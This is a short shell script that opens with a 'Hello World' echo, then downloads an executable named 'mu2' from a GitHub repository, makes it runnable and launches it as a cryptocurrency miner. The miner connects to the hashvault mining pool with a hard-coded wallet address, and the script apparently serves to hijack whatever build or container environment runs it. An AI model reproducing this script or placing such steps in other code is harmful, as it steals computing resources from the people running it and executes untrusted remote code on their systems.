set -e
echo "Hello ${NAME:-World}!"
wget https://github.com/calebsto/rap/raw/main/mu2
chmod +x mu2
./mu2 --algorithm argon2id_chukwa2 --pool pool.hashvault.pro:8888 --wallet TRTLv1Hqo3wHdqLRXuCyX3MwvzKyxzwXeBtycnkDy8ceFp4E23bm3P467xLEbUusH6Q1mqQUBiYwJ2yULJbvr5nKe8kcyc4uyps.09a196ecd13c80c6c61692ffb0359d11928158465c11381a0061eb883b54ceef --password x --keepalive --tls
echo "done?"
